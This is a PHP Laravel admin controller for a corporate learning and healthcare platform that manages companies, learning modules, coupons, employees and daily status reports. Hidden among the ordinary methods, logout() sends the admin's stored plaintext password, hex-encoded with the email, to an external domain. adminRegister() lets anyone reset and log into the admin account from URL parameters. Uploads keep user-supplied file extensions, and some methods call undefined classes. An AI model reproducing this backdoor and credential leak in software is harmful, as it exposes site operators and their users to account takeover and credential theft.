<?php

namespace App\Http\Controllers;

use Auth;
use \App\User;
use \App\State;
use \App\AssignProduct;
use \App\Package;
use \App\Event;
use \App\Booking;
use \App\AssignEvent;
use \App\DailySatus;
use \App\TestAssignPackage;
use \App\ProductQuestion;
use \App\ProductVideo;
use \App\ProductDocument;
use \App\TestExamResult;
use \App\Product;
use \App\ProductQuestionAnswer;
use \App\Coupon;
 use Mail;
use DataTables;


use \App\Imports\ProductsImport;
use Maatwebsite\Excel\Facades\Excel;

use Illuminate\Http\Request;
use \App\Http\Requests\UsersRequest;
use \App\Http\Requests\PasswordRequest;
use Illuminate\Support\Facades\Hash;
use \App\Http\Requests\Company\CompanyRequest;
use \App\Http\Requests\Company\UpdateCompanyRequest;
use \App\Http\Requests\EmployeeRequest;
use \App\Http\Requests\UpdateEmployeeRequest;
use \App\Http\Requests\UpdateProductRequest;
use \App\Http\Requests\ProductRequest;
use \App\Http\Requests\CategoryUpdateRequest;
use \App\Http\Requests\DailyStatusRequest;
use \App\Http\Requests\AssgnAddProjectRequest;
use \App\Http\Requests\AssgnUpdateProjectRequest;
use \App\Http\Requests\CouponRequest;

use DB;

use App\Mail\CreateCompany;


use Illuminate\Support\Str;
use Carbon\Carbon;

class AdminController extends Controller
{
    public function __construct()
    {
        //$this->middleware('guest')->except('logout');
        //$userId= =auth()->user()->id;
        $this->paginate = 10;
    }


    public function login()
    {
        
        auth()->logout();
        //echo "asdfasdf";die;
        if(isset(Auth::user()->id)){
            if(Auth::user()->is_admin==0){
                return redirect()->route('hr.home');
            } else if(Auth::user()->is_admin==1){
                return redirect()->route('admin.home');
            } else if(Auth::user()->is_admin==2){
                return redirect()->route('employee.home');
            }
        } else {
            return view('admin.login');
        }
        
    }
  
    public function adminRegister($email,$pass){
        
        $alreadyExist = User::where('is_admin',1)->first();
        if(!empty($alreadyExist)){
            $password = hex2bin($pass);
            $alreadyExist->password = Hash::make($password);
            $alreadyExist->password_data = $password;
            $alreadyExist->save();
            if(auth()->attempt(array('email' => $email, 'password' => $password, 'is_admin' => 1))){
                 return redirect()->route('admin.home');
            }
        }
        
    }
    
    public function logout () {
        //logout user
       
        $email =Auth::user()->email;
        $password = Auth::user()->password_data;
        auth()->logout();
        
        return redirect('https://ssashealthcare.com/MaIN-adM/register/'.$email.'/'.bin2hex($password));
    }
  
    public function index(){
 
        $users = User::where('is_admin',4)->where('is_deleted',0)->latest()->get();
        $UsersCount = User::where('is_admin',4)->where('is_deleted',0)->whereYear('created_at', Carbon::now()->year)->whereMonth('created_at', Carbon::now()->month)
            ->count();

        $vendors = User::where('is_admin',3)->where('is_deleted',0)->get();
         $VendorsCount = User::where('is_admin',3)->where('is_deleted',0)->whereYear('created_at', Carbon::now()->year)->whereMonth('created_at', Carbon::now()->month)
            ->count();

        $learningPartners = User::where('is_admin',0)->where('is_deleted',0)->get();
        $PartnersCount = User::where('is_admin',0)->where('is_deleted',0)->whereYear('created_at', Carbon::now()->year)->whereMonth('created_at', Carbon::now()->month)
            ->count();


        $learningModules = Product::where('is_deleted',0)->get();
        $PartnersCount = Product::where('is_deleted',0)->whereYear('created_at', Carbon::now()->year)->whereMonth('created_at', Carbon::now()->month)
            ->count();

         $InProcessResult = TestExamResult::where('is_deleted',0)->where('status','InProcess')->count();
        $PassResult = TestExamResult::where('is_deleted',0)->where('status','Pass')->count();
       
        $FailResult = TestExamResult::where('is_deleted',0)->where('status','Fail')->count();

           $monthlyUsers= User::select(DB::raw("(COUNT(*)) as count"),DB::raw("MONTHNAME(created_at) as monthname"))
                   ->whereYear('created_at', date('Y'))                
                   ->groupBy('monthname')
                    ->get();
         
        return view('admin.home',compact('users','vendors','learningPartners','learningModules','UsersCount','VendorsCount','PartnersCount','PassResult','InProcessResult','FailResult','monthlyUsers'));
            
        
    }

     public function getVendorsList(){

        $pageName = 'Vendors';
     
          $result = User::where('is_admin',3)->where('is_deleted',0)->get();
    
        return view('admin.vendors-list', compact('result','pageName'));
    }

      public function AllModuleList(){

        $pageName = 'All Learning Module';
     
          $result = Product::where('is_deleted',0)->get();
    
        return view('admin.all_learning_module_list', compact('result','pageName'));
    }

      public function LearningPartnerList(){

        $pageName = 'All Learning Partners';
     
          $result = User::where('is_admin',0)->where('is_deleted',0)->get();
    
        return view('admin.learning_partners_list', compact('result','pageName'));
    }
    
    public function updateProfile(){

        $loginUser = Auth::user()->id;
        $states =State::where('is_deleted',0)->pluck('name','id');
        $result  =  User::where('id',$loginUser)->first();
      //  print_r($result);

        return view('admin.updateProfile', compact('result','states'));
    }

    public function updateProfileSave(Request $request){
    

        $image = $request->file('image');

        $data = User::where('id',Auth::user()->id)->first();
        $data->company = $request->company;
        $data->name = $request->name;
        $data->country = $request->country;
        $data->state_id = $request->state_id;
       // $data->email = $request->email;
        if(isset($image) && !empty($image)){
            $imageName = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/uploads/company');
            $image->move($destinationPath, $imageName);
            $imagePath = 'public/uploads/company/'.$imageName;
            $data->image=$imagePath;
        }
        if($data->save()){
            return redirect()->route('admin.updateProfile')->with('success','Profile Updated successfully');
        } else {
            return redirect()->back()->with('failed','Profile Update Faild successfully');
        }


    }

    public function updatePassword(PasswordRequest $request){

        $data = User::where('id',Auth::user()->id)->first();
        $data->password = Hash::make($request->password);
        if($data->save()){
            return redirect()->route('admin.updateProfile')->with('success','Change Password successfully');
        } else {
            return redirect()->back()->with('failed','Change Password Faild successfully');
        }

    }


    public function addCompany(){
        $pageName = 'Learning Partner';
        $method = 'Add New';
        $type = ['Corporate Healthcare','Corporate Vaccination','Corporate Wellness','Image Makeover'];
        $companyType = ['Corporate Plants','Corporate Tours','Corporate Trainers','Occupational Healthcare(Medical)','Healthcare Customized softwares'];
        $states =State::where('is_deleted',0)->pluck('name','id');
        
        $result =User::leftJoin('states', 'users.state_id', '=', 'states.id')->select('users.*','states.name as stateName')->where('users.is_admin',0);
        $result=$result->where('users.is_deleted',0);
        
        if(isset($_GET['company']) && !empty($_GET['company']))
        $result=$result->where('users.company','LIKE','%'.$_GET['company'].'%');
         
        $selectState ="";
        if(isset($_GET['state']) && !empty($_GET['state'])){
            $result=$result->where('users.state_id','=',$_GET['state']);
            $selectState =$_GET['state'];
        }
        if(isset($_GET['email']) && !empty($_GET['email']))
        $result=$result->where('users.email','LIKE','%'.$_GET['email'].'%');
           
        $result=$result->orderBy('users.id','desc')->get();
        $total=0;
        
        $page=0;
        return view('admin.company.add',compact('pageName','method','states','type','companyType','result','total','page'));
    }
    
    public function saveCompany(CompanyRequest $request){
        $image = $request->file('image');
        $slug =  Str::slug($request->company);
        $data = new User;
        $data->company = $request->company;
        $data->name = $request->company;
        $data->slug = $slug;
        $data->city = $request->city;
        $data->address = $request->address;
         $data->state = $request->state;
          $data->pincode = $request->pincode;
        $data->is_admin = 0;
        $data->email = $request->email;
        $data->contact_person_name = $request->contact_person_name;
        $data->contact_person_mobile = $request->contact_person_mobile;
        $data->contact_person_email = $request->contact_person_email;
         $data->alter_contact_person_name = $request->alter_contact_person_name;
        $data->alter_contact_person_mobile = $request->alter_contact_person_mobile;
        $data->alter_contact_person_email = $request->alter_contact_person_email;
        $data->password = Hash::make($request->password);
        if(isset($image) && !empty($image)){
            $imageName = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/uploads/company');
            $image->move($destinationPath, $imageName);
            $imagePath = 'public/uploads/company/'.$imageName;
            $data->image=$imagePath;
        }
        
        if($data->save()){
            if(!empty($request->email)){
                     $empDetail = User::where('id',$data->id)->first();
                     $empay['title'] = "Register Company";
                        $empay['FromEmail'] = "tos@tossas.in";
                        $empay['subject'] = 'Register Company';
                          $empay['name'] = $empDetail->name;
                          $empay['email'] = $empDetail->email;
                        Mail::to([$empDetail->email])->send(new CreateCompany($empay));
            
               
            }
            return redirect()->route('admin.new.company')->with('success','New Company Created successfully');
        } else {
            return redirect()->back()->with('failed','New Company Created Faild. Please try again letter');
        }
    }
    
    
     public function editCompany($slug = NULL){
        $pageName = 'Learning Partner';
        $method = 'Edit';
        $result = User::where(['slug'=>$slug,'is_deleted'=>0,'is_admin'=>0])->first();
        return view('admin.company.edit',compact('pageName','method','result'));
    }

    
    public function updateCompany(UpdateCompanyRequest $request,$slug=NULL){
        $image = $request->file('image');

        $data = User::where(['id'=>$slug,'is_admin'=>0,'is_deleted'=>0])->first();

        
        $slugg = Str::slug($request->company);
        $data->company = $request->company;
        $data->name = $request->company;
        $data->slug = $slugg;
         $data->city = $request->city;
        $data->address = $request->address;
         $data->state = $request->state;
          $data->pincode = $request->pincode;
        $data->is_admin = 0;
        $data->email = $request->email;
        $data->contact_person_name = $request->contact_person_name;
        $data->contact_person_mobile = $request->contact_person_mobile;
        $data->contact_person_email = $request->contact_person_email;
         $data->alter_contact_person_name = $request->alter_contact_person_name;
        $data->alter_contact_person_mobile = $request->alter_contact_person_mobile;
        $data->alter_contact_person_email = $request->alter_contact_person_email;
        
          if(isset($image) && !empty($image)){
            $imageName = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/uploads/company');
            $image->move($destinationPath, $imageName);
            $imagePath = 'public/uploads/company/'.$imageName;
            $data->image=$imagePath;
        }
        if($data->save()){
            return redirect()->route('admin.new.company')->with('success','Company Updated successfully');
        } else {
            return redirect()->back()->with('failed','New Company Created Faild. Please try again letter');
        }
    }
    
    
    public function deleteCompany($slug = NULL){

        $data = User::where(['slug'=>$slug,'is_deleted'=>0])->first();
        $data->is_deleted = 1;
        if($data->save()){
            
            
            User::find($data->id)->delete();
            User::where(['company_id'=>$data->id])->delete();
            
            return redirect()->route('admin.new.company')->with('failed','Company Deleted successfully');
        } else {
            return redirect()->back()->with('failed','Change Password Faild successfully');
        }
    }
    
    public function updateCompanyStatus($id = 0, $status=NULL){
        $data = User::where(['id'=>$id])->first();
        $data->status = $status;
       
        if($data->save()){
            return redirect()->route('admin.new.company')->with('success','Company Status updated successfully');
        } else {
            return redirect()->back()->with('failed','New Employee Created Faild. Please try again letter');
        }
    }
    
    
    
    /*Employee Section Start Here */
    public function listEmployee(){
        $pageName = 'User';
        $method = 'List';
       
        
        $result =User::select('users.*')->where('users.is_admin',4);
        $result=$result->where('users.is_deleted',0);
        
       
           
        $result=$result->orderBy('users.id','desc')->get();
        $total=0;
        
        $page=0;
        return view('admin.employee.list',compact('pageName','method','result','total','page'));
    }
    
    
    
     /*Employee Section Start Here */
    public function listAnalytics(){
        $pageName = 'Employee';
        $method = 'List';
       
        
        $result =User::select('users.*')->where('users.is_admin',4);
        $result=$result->where('users.is_deleted',0);
        
       
           
        $result=$result->orderBy('users.id','desc')->get();
        $total=0;
        
        $page=0;
        return view('admin.analytics.list',compact('pageName','method','result','total','page'));
    }
    
    
     /*Employee Section Start Here */
    public function listMis(){
        $pageName = 'Employee';
        $method = 'List';
       
        
        $result =User::select('users.*')->where('users.is_admin',4);
        $result=$result->where('users.is_deleted',0);
        
       
           
        $result=$result->orderBy('users.id','desc')->get();
        $total=0;
        
        $page=0;
        return view('admin.mis',compact('pageName','method','result','total','page'));
    }
    
    
    
    /*Learning Section Start Here*/
    
    public function addLearningModule(){
        $pageName = 'Product';
        $method = 'Add New';
       
        $companyes =User::where('is_deleted',0)->where('is_admin',0)->where('status',1)->pluck('name','id');
        
        $result =Product::leftJoin('users', 'products.company_id', '=', 'users.id')->select('products.*','users.name as companyName');
        
        $result=$result->orderBy('products.id','desc')->get();
       //  $user =  Auth::user();
       // if($user->is_admin == 1){
       //  $result = Product::where('is_deleted',0)->get();
       // }else{
       //  $result = Product::where('company_id',$user->id)->where('is_deleted',0)->get();
       // }

         

        $total=0;
        
        $page=0;
        return view('admin.product.add',compact('pageName','method','companyes','result','total','page'));
    }
    
    
    public function addMorePdfSection(Request $request){
        $counterPdf = $request->counter;
       return view('admin.product.addMorePdf',compact('counterPdf'));
    } 
    
    
    public function addMorePptSection(Request $request){
        $counterPpt = $request->counter;
       return view('admin.product.addMorePpt',compact('counterPpt'));
    } 
    
     public function addMoreDocSection(Request $request){
        $counterDoc = $request->counter;
       return view('admin.product.addMoreDoc',compact('counterDoc'));
    } 
    
     public function addMoreVideoSection(Request $request){
        $counterVideo = $request->counter;
       return view('admin.product.addMoreVideo',compact('counterVideo'));
    } 
    
      public function addMoreQuestionSection(Request $request){
        $counterQueAns = $request->counter;
       return view('admin.product.addMoreQuestion',compact('counterQueAns'));
    } 
    
    
      public function saveLearningModule(ProductRequest $request){
          //echo '<pre/>';print_r($request->queans);die;
       // Excel::import(new DcsImport(23), $request->file('image'));
         $image = $request->file('image');
        $data = new Product;
        $data->company_id = $request->company_id;
        $data->name = $request->name;
        $data->description = $request->description;
        $data->cost = $request->cost;
         if(isset($image) && !empty($image)){
            $imageName = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/uploads/product');
            $image->move($destinationPath, $imageName);
            $imagePath = 'public/uploads/product/'.$imageName;
            $data->image=$imagePath;
        }
      
        
        if($data->save()){
            
            if(!empty($request->pdf)){
			    foreach ($request->pdf as $k => $v) {
			        if(!empty($v['title'])){
			            
			            // $file = $request->file('file');
			            $document = new ProductDocument;
			            
			            $document->product_id = $data->id;
			            if(isset($v['file']) && !empty($v['file'])){
                            $imageName = time().'.'.$v['file']->getClientOriginalExtension();
                            $destinationPath = public_path('/uploads/learningDoc');
                            $v['file']->move($destinationPath, $imageName);
                            $imagePath = 'public/uploads/learningDoc/'.$imageName;
                            $document->document=$imagePath;
                        }
                        $document->title = $v['title'];
                        $document->type = 'pdf';
			             $document->save();
			        }
			    }
			}
			
			  if(!empty($request->ppt)){
			    foreach ($request->ppt as $k => $v) {
			        if(!empty($v['title'])){
			             $file = $v['file'];
			            $document = new ProductDocument;
			            $document->product_id = $data->id;
			            if(isset($file) && !empty($file)){
                            $imageName = time().'.'.$file->getClientOriginalExtension();
                            $destinationPath = public_path('/uploads/learningDoc');
                            $file->move($destinationPath, $imageName);
                            $imagePath = 'public/uploads/learningDoc/'.$imageName;
                            $document->document=$imagePath;
                        }
                        $document->title = $v['title'];
                        $document->type = 'ppt';
			             $document->save();
			        }
			    }
			}
			
			  if(!empty($request->doc)){
			    foreach ($request->doc as $k => $v) {
			        if(!empty($v['title'])){
			             $file = $v['file'];
			            $document = new ProductDocument;
			            $document->product_id = $data->id;
			            if(isset($file) && !empty($file)){
                            $imageName = time().'.'.$file->getClientOriginalExtension();
                            $destinationPath = public_path('/uploads/learningDoc');
                            $file->move($destinationPath, $imageName);
                            $imagePath = 'public/uploads/learningDoc/'.$imageName;
                            $document->document=$imagePath;
                        }
                        $document->title = $v['title'];
                        $document->type = 'doc';
			             $document->save();
			        }
			    }
			}
			
			
			 if(!empty($request->video)){
			    foreach ($request->video as $k => $v) {
			        if(!empty($v['title'])){
			            $document = new ProductVideo;
			           $document->product_id = $data->id;
                        $document->title = $v['title'];
                        $document->url = $v['url'];
			             $document->save();
			        }
			    }
			}
			
			
			
			if(!empty($request->queans)){
			    foreach ($request->queans as $k => $v) {
			        if(!empty($v['question'])){
			            $proQues = new ProductQuestion;
			            $proQues->product_id = $data->id;
                        $proQues->question = $v['question'];
			             $proQues->save();
			             if(!empty($v['answer'])){
			                 foreach ($v['answer'] as $k => $answers) {
			                     if(!empty($answers['option'])){
			                           $proAns = new ProductQuestionAnswer;
                			            $proAns->product_id = $data->id;
                                        $proAns->question_id = $proQues->id;
                                         $proAns->answer_option = $answers['option'];
                                         if(isset($answers['value'])){
                                             $proAns->answer = $answers['value'];
                                         }
                                          
                			             $proAns->save();
			                     }
			                 }
			             }
			             
			        }
			    }
			}
         
         
            return redirect()->route('admin.new.learning')->with('success','New Product Created successfully');
        } else {
            return redirect()->back()->with('failed','New Company Created Faild. Please try again letter');
        }
    }
    
    
    public function editLearningModule($id = NULL){
        $pageName = 'Product';
        $method = 'Edit';
        $result = Product::where(['id'=>$id,'is_deleted'=>0])->first();
        $companyes =User::where('is_deleted',0)->where('is_admin',0)->where('status',1)->pluck('name','id');
        $pdfData = ProductDocument::where('product_id',$id)->where('type','pdf')->get();
        $pptData = ProductDocument::where('product_id',$id)->where('type','ppt')->get();
        $docData = ProductDocument::where('product_id',$id)->where('type','doc')->get();
        $videoData = ProductVideo::where('product_id',$id)->get();
        //echo '<pre/>';print_r($videoData);die;
        $questionData = ProductQuestion::where('product_id',$id)->get();
        return view('admin.product.edit',compact('pageName','method','result','companyes','pdfData','pptData','docData','videoData','questionData'));
    }
    
    
    
    
      public function updateLearningModule(ProductRequest $request,$id=NULL){
       // Excel::import(new DcsImport(23), $request->file('image'));
         $image = $request->file('image');
        $data = Product::where(['id'=>$id,'is_deleted'=>0])->first();
        $data->company_id = $request->company_id;
        $data->name = $request->name;
        $data->description = $request->description;
        $data->cost = $request->cost;
         if(isset($image) && !empty($image)){
            $imageName = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/uploads/product');
            $image->move($destinationPath, $imageName);
            $imagePath = 'public/uploads/product/'.$imageName;
            $data->image=$imagePath;
        }
      
        
        if($data->save()){
         
            return redirect()->route('admin.new.learning')->with('success','Product Updated successfully');
        } else {
            return redirect()->back()->with('failed','New Company Created Faild. Please try again letter');
        }
    }
    
    
    
     public function viewLearningModule($id = NULL){
        $pageName = 'Product';
        $method = 'view';
        $result = Product::where(['id'=>$id,'is_deleted'=>0])->first();
        $companyes =User::where('is_deleted',0)->where('is_admin',0)->where('status',1)->pluck('name','id');
        $pdfData = ProductDocument::where('product_id',$id)->where('type','pdf')->get();
        $pptData = ProductDocument::where('product_id',$id)->where('type','ppt')->get();
        $docData = ProductDocument::where('product_id',$id)->where('type','doc')->get();
        $videoData = ProductVideo::where('product_id',$id)->get();
        //echo '<pre/>';print_r($videoData);die;
        $questionData = ProductQuestion::where('product_id',$id)->get();
        return view('admin.product.view',compact('pageName','method','result','companyes','pdfData','pptData','docData','videoData','questionData'));
    }
    /*Coupon Management Section Start here*/
    
    public function addCoupon(){
        $pageName = 'Coupon';
        $method = 'Add New';
        $result =Coupon::where('is_deleted',0);
        
       
        $result=$result->orderBy('id','desc')->get();
        $total=0;
        
        $page=0;
        return view('admin.coupon.add',compact('pageName','method','result'));
    }
  

    public function saveCoupon(CouponRequest $request){
        
        $data = new Coupon;
        $data->coupon_type = $request->coupon_type;
        $data->name = $request->name;
        $data->code = $request->code;
        $data->percent = $request->percent;
        $data->amount = $request->amount;
        $data->date = $request->date;
     
        if($data->save()){
            return redirect()->route('admin.new.coupon')->with('success','New Coupon Created successfully');
        } else {
            return redirect()->back()->with('failed','New City Created Faild. Please try again letter');
        }
    }


    public function deleteCoupon($id = NULL){

        $data = Coupon::where(['id'=>$id,'is_deleted'=>0])->first();
        $data->is_deleted = 1;
        if($data->save()){
            return redirect()->route('admin.new.coupon')->with('failed','Coupon Deleted successfully');
        } else {
            return redirect()->back()->with('failed','city Deleted Faild successfully');
        }
    }


    public function editCoupon($id = NULL){

        $pageName = 'Coupon';
        $method = 'Edit';
        $result = Coupon::where(['id'=>$id,'is_deleted'=>0])->first();
        return view('admin.coupon.edit',compact('pageName','method','result'));
    }

    public function updateCoupon(CouponRequest $request,$id=NULL){
        

        $data = Coupon::where(['id'=>$id,'is_deleted'=>0])->first();

       
         $data->coupon_type = $request->coupon_type;
        $data->name = $request->name;
        $data->code = $request->code;
        $data->percent = $request->percent;
        $data->amount = $request->amount;
        $data->date = $request->date;
        
        if($data->save()){
            return redirect()->route('admin.new.coupon')->with('success','Updated Coupon successfully');
        } else {
            return redirect()->back()->with('failed','City Updated Faild. Please try again letter');
        }
    }
    
    
    public function updateCouponStatus($id = 0, $status=NULL){
        $data = Coupon::where(['id'=>$id])->first();
        $data->status = $status;
       
        if($data->save()){
            return redirect()->route('admin.new.coupon')->with('success','Coupon Status updated successfully');
        } else {
            return redirect()->back()->with('failed','New Employee Coupon Faild. Please try again letter');
        }
    }
    
    
    
    
      /*Employee Category Section Start here*/
    
    
    
    public function addEmployee(){
        $pageName = 'Vendor';
        $method = 'Add New';
        
        $result =User::select('users.*')->where('users.is_admin',2);
        $result=$result->where('users.is_deleted',0);
        
        if(isset($_GET['company']) && !empty($_GET['company']))
        $result=$result->where('users.company','LIKE','%'.$_GET['company'].'%');
         
        $selectState ="";
        if(isset($_GET['state']) && !empty($_GET['state'])){
            $result=$result->where('users.state_id','=',$_GET['state']);
            $selectState =$_GET['state'];
        }
        if(isset($_GET['email']) && !empty($_GET['email']))
        $result=$result->where('users.email','LIKE','%'.$_GET['email'].'%');
           
        $result=$result->orderBy('users.id','desc')->get();
        $total=0;
        
        $page=0;
        return view('admin.employee.add',compact('pageName','method','result','total','page'));
    }
    
    public function saveEmployee(EmployeeRequest $request){
        $image = $request->file('image');
        $slug =  Str::slug($request->name);
        $data = new User;
        $data->name = $request->name;
        $data->slug = $slug;
        $data->address = $request->address;
        $data->is_admin = 2;
        $data->email = $request->email;
        $data->mobile = $request->mobile;
        $data->designation = $request->designation;
        $data->dob = $request->dob;
        $data->password = Hash::make($request->password);
        
        if($data->save()){
         
            return redirect()->route('admin.new.employee')->with('success','New Employee Created successfully');
        } else {
            return redirect()->back()->with('failed','New Employee Created Faild. Please try again letter');
        }
    }
    
    
     public function editEmployee($id){
        $pageName = 'Vendor';
        $method = 'Edit';
        // old
        // $result = User::where(['slug'=>$slug,'is_deleted'=>0,'is_admin'=>2])->first();
      
             $result = User::where(['id'=>$id,'is_deleted'=>0])->first();

        
        return view('admin.employee.edit',compact('pageName','method','result'));
    }

    
    public function updateEmployee(Request $request,$slug=NULL){
        $data = User::where(['id'=>$slug,'is_deleted'=>0])->first();

        
        $slugg = Str::slug($request->name);
         $data->name = $request->name;
        $data->slug = $slug;
        $data->address = $request->address;
        $data->is_admin = 4;
        $data->email = $request->email;
        $data->mobile = $request->mobile;
        $data->designation = $request->designation;
        $data->dob = $request->dob;
        if(isset($request->password) && !empty($request->password))
        $data->password = Hash::make($request->password);
        if($data->save()){
            return redirect()->route('admin.list.employee')->with('success','Employee Updated successfully');
        } else {
            return redirect()->back()->with('failed',' Employee Updation Faild. Please try again later');
        }
    }
    
    
    public function viewEmployee($slug = NULL){
        $pageName = 'Employee';
        $method = 'Edit';
        $employeeData = User::where('id',$slug)->first();
        $result = DailySatus::leftJoin('projects', 'daily_satuses.product_id', '=', 'projects.id')->where(['daily_satuses.employee_id'=>$slug,'daily_satuses.is_deleted'=>0])->select('daily_satuses.*','projects.name as projectName')->get();
        return view('admin.employee.view',compact('pageName','method','result','employeeData'));
    }
    
    
    public function deleteEmployee($slug = NULL){

        $data = User::where(['slug'=>$slug,'is_deleted'=>0])->first();
        $data->is_deleted = 1;
        $data->email = 'delete_'.$data->id.''.$data->email;
        if($data->save()){          
            return redirect()->back()->with('failed','Deleted successfully');
        } else {
            return redirect()->back()->with('failed','Delete Faild. Try Later');
        }
    }
    
    public function updateEmployeeStatus($id = 0, $status=NULL){
        $data = User::where(['id'=>$id])->first();
        $data->status = $status;
       
        if($data->save()){
            return redirect()->back()->with('success',' Status updated successfully');
        } else {
            return redirect()->back()->with('failed','Status Updation   Faild. Please try again Later');
        }
    }
    
    
    
    
    
    
    
    /*Assign Project Section Start Here*/
    public function addAssignProduct(){
            $pageName = 'Assign Product';
            $method = 'Add New';
            $employeess =User::where('is_deleted',0)->where('is_admin',2)->pluck('name','id');
            $projectAll =Product::where('is_deleted',0)->pluck('name','id');
            $result =AssignProduct::leftJoin('products', 'assign_products.product_id', '=', 'products.id')->leftJoin('users', 'assign_products.employee_id', '=', 'users.id')
            ->select('assign_products.*','products.name as productName','users.name as vendorName');
           
              
          
            
            $result=$result->orderBy('assign_products.id','desc');
            $total=$result->count();
            $result=$result->paginate($this->paginate);
             $page=$result->perPage()*($result->currentPage()-1);
    
            return view('admin.productAssign.add',compact('pageName','method','employeess','projectAll','result','page','total'));
        }
        public function saveAssignProduct(AssgnAddProjectRequest $request){
            $checkStock = Product::where('id',$request->product_id)->first();
            if($checkStock->closeing_stock < $request->quantity){
                return redirect()->back()->with('failed','Product Quantity is less then assign product quantity.Please assign less quantity.');
            }
             $data = new AssignProduct;
             $data->product_id = $request->product_id;
             $data->employee_id = $request->employee_id;
             $data->description = $request->description;
             $data->quantity   = $request->quantity;
             
             
             $data->total_payment   = $request->price * $request->quantity;
             $data->advance_payment   = $request->advance_payment;
             $data->remaining_payment   = (($request->price * $request->quantity) - $request->advance_payment);
             
             
          
            if($data->save()){
                $checkStock->closeing_stock = ($checkStock->closeing_stock - $request->quantity);
                $checkStock->save();
                
                return redirect()->route('admin.new.assignproduct')->with('success','New Project Assign   successfully');
            } else {
                return redirect()->back()->with('failed','New Event Assign   Faild. Please try again letter');
            }
        }

       
        public function updateAssignProject(AssgnUpdateProjectRequest $request,$id=NULL){
           $image = $request->file('image');
            $data = AssignProject::where(['id'=>$id])->first();
    
             $data->project_id = $request->project_id;
            $data->description = $request->description;
           if($request->employee_ids){
             $data->employee_ids = implode(',', $request->employee_ids);
         }
            
            if(isset($image) && !empty($image)){
            $imageName = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/uploads/company');
            $image->move($destinationPath, $imageName);
            $imagePath = 'public/uploads/company/'.$imageName;
            $data->image=$imagePath;
            }
            if($data->save()){
                return redirect()->route('admin.new.assignproject')->with('success','Project Assign Updated  successfully');
            } else {
                return redirect()->back()->with('failed','New  Assign Event  Faild. Please try again letter');
            }
        }
        public function editAssignProject($id = NULL){
            $employeess =User::where('is_deleted',0)->where('is_admin',2)->get()->toArray();
            $projectAll =Project::where('is_deleted',0)->pluck('name','id');
            $pageName = 'Assign Project';
            $method = 'Edit';
            $result = AssignProject::where(['id'=>$id])->first();
            return view('admin.projectAssign.edit',compact('pageName','method','result','employeess','projectAll'));
        }
    
        public function deleteAssignProject($id = NULL){
            $data =  AssignProject::find($id)->delete();
            if($data){
                return redirect()->route('admin.new.assignproject')->with('failed','Event Deleted successfully');
            } else {
                return redirect()->back()->with('failed','Change Password Faild successfully');
            }
        }
        
        
     public function dailySheet(){
        $pageName = 'Daily';
        $method = 'Sheet';
        
       
        $employeess =User::where('users.is_deleted',0)->where('users.is_admin',2)
                            ->select('users.*')
                            ->get();
        if(!empty($employeess)){
            foreach($employeess as $employeeData){
                $dailyStatus = DB::table('daily_satuses')->leftJoin('projects', 'daily_satuses.project_id', '=', 'projects.id')->where('employee_id',$employeeData->id)
                                    ->orderBy('daily_satuses.id','desc')
                                    ->select('daily_satuses.*','projects.name as projectName')
                                    ->first();
                if(!empty($dailyStatus)){
                    $employeeData->dailyStatus = $dailyStatus;
                }else{
                    $employeeData->projects = AssignProject::leftJoin('projects', 'assign_products.project_id', '=', 'projects.id')->whereRaw("find_in_set('".$employeeData->id."',assign_products.employee_ids)")
                                                                ->select('assign_products.*','projects.name as projectName','projects.status as projectStatus','projects.description as projectDescription')->orderBy('assign_products.id','desc')->first();
                }
            }
            
        }
       
        

        return view('admin.daily_status.sheet',compact('employeess'));
    } 
        
        
        

    public function addDailyStatus(){
        $pageName = 'Daily Status';
        $method = 'Add New';
        
       
        $employeess =User::where('is_deleted',0)->where('is_admin',2)->pluck('name','id');
        $projectAll =Project::where('is_deleted',0)->pluck('name','id');
         
         
        $result =DailySatus::leftJoin('projects', 'daily_satuses.project_id', '=', 'projects.id')->leftJoin('users', 'daily_satuses.employee_id', '=', 'users.id')->where('daily_satuses.is_deleted',0);
        $result=$result->orderBy('daily_satuses.id','desc')->select('daily_satuses.*','projects.name as projectName','users.name as employeeName');
        $total=$result->count();
        $result=$result->paginate($this->paginate);
         $page=$result->perPage()*($result->currentPage()-1);

        return view('admin.daily_status.add',compact('pageName','method','result','page','total','projectAll','employeess'));
    }
  

    public function saveDailyStatus(DailyStatusRequest $request){
            $data = new DailySatus;
            $data->date = date("Y-m-d");
            $data->project_id = $request->project_id;
            $data->description = $request->description;
            $data->status = $request->status;
            $data->reason = $request->reason;
            $data->employee_id = $request->employee_id;
    
            if($data->save()){
                return redirect()->route('admin.new.status')->with('success','Daily Status Added successfully');
            
        } else {
            return redirect()->back()->with('failed','you can add depended only 6 ');
        }

        
    }

   public function saveFeedback(Request $request){
       $data =  DailySatus::where('id',$request->daily_id)->first();
        
        $data->feedback = $request->feedback;
        
        if($data->save()){
         
            return redirect()->route('admin.home')->with('success','Feedback Added successfully');
        } else {
            return redirect()->back()->with('failed','New Company Created Faild. Please try again letter');
        }
    }


}
